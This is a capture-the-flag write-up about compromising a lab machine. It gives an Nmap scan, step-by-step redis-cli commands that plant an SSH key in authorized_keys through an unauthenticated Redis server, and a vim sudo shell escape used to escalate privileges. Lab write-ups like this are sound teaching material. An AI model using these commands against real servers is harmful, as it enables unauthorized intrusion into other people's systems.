# Blue team becomes Red Team

![](https://i.imgur.com/oX7N2F5.png)

- this challenge comes with another machine that is identical in the boot screen to the one in the `Locked Outside` challenge so let's boot it and start the Nmap scan

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 00:40 EDT
Discovered open port 80/tcp on 10.0.2.17
Discovered open port 22/tcp on 10.0.2.17
Discovered open port 6379/tcp on 10.0.2.17
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUfxuf+Y9ICIozkbq2t2qrktAL1/uuwg1Gsh3td/uQ+2s5PYL3R8jZFnFYXB3/mRDrugzjghzkU9l1tlHBNWFTtQHwcaHDPyz0Rrx8eTOPrSfqr4OQv2w7lEWuw/obUYQW6V+VqDeGCi2fFmfUaPXrbPrcyIYBzHYAcSQPHR27rSckNLP066J8s/0C/POyrIX0TiOGgVOqA9kDNCUFIl1SCFQeqsWlmjivXxiUh6IZQwRdA58zkFW1Fxbzl4EZNEXyPK+/T07ZI8OIWCdI6LvoO+jrepos/r6Gprw0bPr6TNHLIxGsVYR0lrkcnUr8RoSGteS+bu81k+c9+ahMQgIUEetp7V3ASm676CnOxZ3Q182ECcwSA2bvwsLhMWOOrVwvJOTXdnrzKy/YKmPqY+xz592hHsv5pBj3RNp4C8vl3BZzQzl+7xkOTVkrfuTPab7B9MSzYisveYX/Yxrw5qvrvsBUWZpopZCi9SefSTVcYMnswAuUeNyqZRHMvRcc5oM=
|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHIJGMwqXiPkyMB5UeGlr3/gWwMVqenfOvHr8ZRHzFX6Qvqt5CMq6jeZkTKjyik2oR+iyWhG+xUnDA1b9hz5enA=
|   256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjY/PxV7U/UezwqeFt/5iKT4+vdgsuUdZgKX70l+IGr
80/tcp   open  http    syn-ack ttl 64 Node.js Express framework
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Hyperion Group - Coming Soon
6379/tcp open  redis   syn-ack ttl 64 Redis key-value store 6.0.14
```

- port 80 have the same website that was in the `Know Your Enemy` so from the last challenge we know nothing interesting was there so our only option is the Redis
- I used this [blog](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) to try to penetrate the service and get a shell, the one that worked for me was the ssh which consists of the following steps
  1. Generate an ssh public-private key pair on your pc: `ssh-keygen -t rsa`
  2. Write the public key to a file : `(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt`
  3. Import the file into redis : `cat foo.txt | redis-cli -h 10.0.2.17 -x set crackit`
  4. Save the public key to the authorized_keys file on redis server:

```bash
root@kali:~# redis-cli -h 10.0.2.17
10.85.0.52:6379> config set dir /var/lib/redis/.ssh (we know the home directory because we ran INFO)
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

  5. Finally, you can ssh to the redis server with private key : ssh -i id_rsa redis@10.0.2.17

- now that we have a shell we can run `sudo -l` to know what commands we can run as another user

```bash
hyp3r10n:~$ sudo -l
User redis may run the following commands on hyp3r10n:
(hype) NOPASSWD: /home/hype/backup.sh, /usr/bin/vim /home/hype/backup.sh
```

- looks like we have to priv escalate to hype first then to root, this time we can run only one file as vim so we have to modify the command a bit from the previous machine which was `sudo vim -c ":!/bin/ash"` now for this machine we can run the vim command first `sudo -u hype /usr/bin/vim /home/hype/backup.sh` then we can press ESC then type this `:!/bin/ash`

![](https://i.imgur.com/G94lMnX.png)

- and the flag can be found at `~/user.txt`

- Flag: flag{succ3ssfully_1nf1ltr4t3d}
